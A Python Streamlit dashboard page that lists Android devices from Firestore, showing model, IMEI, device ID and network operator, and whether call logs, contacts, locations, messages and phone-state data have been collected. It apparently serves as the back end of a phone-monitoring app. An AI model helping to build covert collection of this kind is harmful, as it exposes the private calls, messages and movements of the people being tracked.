# pages/device_overview.py

import streamlit as st
from google.cloud.firestore_v1 import Client

def show_device_overview(db: Client):
    st.subheader("📱 Device Overview")

    # Process email for Firestore structure
    user_email = st.session_state.email.replace('.', '_dot_').replace('@', '_at_') \
        .replace('/', '_').replace('[', '_').replace(']', '_').replace('*', '_').replace('?', '_')

    try:
        # Fetch device metadata collection - Updated path based on Firebase structure
        devices_ref = db.collection("users").document(user_email).collection("devices")
        devices = devices_ref.stream()
        device_map = {doc.id: doc.to_dict() for doc in devices}

        if not device_map:
            st.warning("⚠️ No devices found in Firestore.")
            st.info("Make sure your Android app is sending data to Firebase.")
            return

        device_ids = list(device_map.keys())
        selected_device = st.selectbox("Select a Device", device_ids, key="device_overview_select")

        if selected_device:
            device = device_map[selected_device]

            st.markdown("### 📊 Device Information")
            
            # Create columns for better layout
            col1, col2, col3 = st.columns(3)
            
            with col1:
                st.metric("📱 Device Model", device.get('device', 'Unknown'))
                st.metric("🏭 Brand", device.get('brand', 'Unknown'))
                st.metric("🤖 Android Version", device.get('androidVersion', 'Unknown'))
                
            with col2:
                st.metric("🔧 Hardware", device.get('hardware', 'Unknown'))
                st.metric("🏗️ Build ID", device.get('buildId', 'Unknown')[:10] + "..." if device.get('buildId') else 'Unknown')
                st.metric("📡 Network Operator", device.get('networkOperatorName', 'Unknown'))
                
            with col3:
                st.metric("📞 Device ID", device.get('deviceId', 'Unknown')[:10] + "..." if device.get('deviceId') else 'Unknown')
                st.metric("📶 IMEI Status", device.get('imei', 'Unknown'))
                st.metric("🔋 Active Status", "✅ Active" if device.get('isActive', False) else "❌ Inactive")

            # Additional device details in expandable section
            with st.expander("🔍 Detailed Device Information"):
                st.json(device)

            # Device activity metrics
            st.markdown("### 📈 Device Activity")
            
            # Check for subcollections
            try:
                # Count documents in subcollections
                collections_info = {}
                
                subcollections = ['call_logs', 'contacts', 'locations', 'messages', 'phone_state', 'weather']
                for collection_name in subcollections:
                    try:
                        count = len(list(devices_ref.document(selected_device).collection(collection_name).limit(1).stream()))
                        collections_info[collection_name] = "✅ Available" if count > 0 else "❌ No Data"
                    except:
                        collections_info[collection_name] = "❌ No Data"
                
                col1, col2, col3 = st.columns(3)
                with col1:
                    st.metric("📞 Call Logs", collections_info.get('call_logs', 'Unknown'))
                    st.metric("👥 Contacts", collections_info.get('contacts', 'Unknown'))
                    
                with col2:
                    st.metric("🌍 Locations", collections_info.get('locations', 'Unknown'))
                    st.metric("💬 Messages", collections_info.get('messages', 'Unknown'))
                    
                with col3:
                    st.metric("📶 Phone State", collections_info.get('phone_state', 'Unknown'))
                    st.metric("🌦️ Weather", collections_info.get('weather', 'Unknown'))
                    
            except Exception as e:
                st.error(f"Error checking subcollections: {str(e)}")

    except Exception as e:
        st.error(f"❌ Error loading devices: {str(e)}")
        st.info("Check your Firebase connection and permissions.")